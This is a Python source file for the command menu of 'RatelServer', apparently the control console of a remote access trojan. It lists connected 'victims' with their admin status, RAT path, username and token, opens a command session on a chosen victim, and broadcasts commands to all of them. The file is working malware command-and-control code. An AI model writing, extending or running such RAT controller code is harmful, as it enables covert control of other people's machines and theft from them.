#from .handler import Handler
#from .session import Session
#from .management import Management
#from .management import CheckConn
#from .other import printColor



from colorama import Fore,Style

from .handler import Handler
from .session import Session
from .management import Management
from .management import CheckConn
from .other import printColor
from .other import printAllTarget
from .sql import Sql
from .broadcast import Broadcast
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT

import time
import platform

if(platform.system() == "Linux"):
    import readline
else: #if windows
    import pyreadline
   

class Menu:
    RESET_COLOR = Style.RESET_ALL
    def help(self):
        printColor("help","""
 -h or --help : Displays all server commands.

 -ls or --list : Displays all clients with their information.

 -t session_id  or --target session_id : Selects a session (client) to be able to execute commands (mod session). 

 -cde or --connectionDisplayEnable : Activate the display of client information (Logoff and incoming connection).

 -cdd or --connectionDisplayDisable : Disables the display of client information (Logoff and incoming connection).
 
 --broadcast : Start a session with all targets (mod broadcast).

 --exit : Stop the server. 
 
""")

    def changeStatusDisplay(self,true_or_false): 
        #this method enables or disables the display of connections on the terminal.
        Handler.status_connection_display= true_or_false
        if(true_or_false):
            printColor("information","[-] The connection display is active.\n")
        else:
            printColor("information","[-]The connection display is deactivated.\n")
    

    def selectTarget(self,target):    
        #Select target.
        #session, socket, ip, port, is_he_alive, is_he_admin, path_RAT, username, token        
        '''
        When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False).
        This serves to avoid confusion when sending data. 
        '''

        if(target in Handler.dict_conn.keys()):
            printColor("information","[+] You are in the MOD SESSION")
            printColor("information","[+] Selected session: {}".format(Handler.dict_conn[target][NB_SESSION]))
            if(Handler.dict_conn[target][NB_ALIVE]):
                Handler.dict_conn[target][NB_SELECT] = True
                session = Session(Handler.dict_conn[target][NB_SOCKET],Handler.dict_conn[target][NB_IP],Handler.dict_conn[target][NB_PORT], target) #def __init__(self,socket,ip_client,port_client,session_nb): 
                session.main() 
                Handler.dict_conn[target][NB_SELECT] = False
                #print("Enable target...\n")
            else:
                printColor("information","[-] The target is currently offline.\n")
        else:
            printColor("information","[-] No target found. Please enter a valid target.\n")

        printColor("information","[?] You are in MOD MAIN\n")

    def selectBroadcast(self):
        #Add to the start of the "MOD_ALL" command to tell the client to switch to MOD_ALL
        
        #Management.running = False test

        if len(Handler.dict_conn) != 0:
            
            Broadcast().main()

        else:
            printColor("error","[+] No connection is enabled.\n")
        
        printColor("information", "[-] You are in MOD MAIN\n")

        #Management.running = True test

    def main(self):
        
        if(Handler.status_connection_display):
            printColor("help","[?] By default, the connection display is active.To avoid being generated, you can deactivate it with the -cdd command.")
        
        printColor("help","[?] Run -h or --help to list the available commands.\n")
        checker = True

        while checker:
            try:
                choice = str(input("RatelServer> ")).split()
            except ValueError:
                break

            printColor("help","[?] Command execute: {}\n".format(choice))

            for i in range(0,len(choice)):

                if(choice[i] == "--help" or choice[i] == "-h"):
                    self.help()

                elif(choice[i] == "-t" or choice[i] =="--target"):
                    try:
                        self.selectTarget(int(choice[i+1])) #int car -t 10 <- 10 doit ^etre un int 
                    except IndexError:
                        printColor("information","[-] No target found. Please enter a valid target.\n")
                        
                elif(choice[i] == "-ls" or choice[i] == "--list"):
                    printAllTarget()
                
                elif(choice[i]== "--connectionDisplayDisable" or choice[i] == "-cdd"):
                    self.changeStatusDisplay(False)
                
                elif(choice[i]=="--connectionDisplayEnable" or choice[i] == "-cde"):
                    self.changeStatusDisplay(True)
                
                elif(choice[i] == "--broadcast"):
                    self.selectBroadcast()
                
                elif (choice[i] == "--exit"):
                    checker = False

                else:
                    pass 
                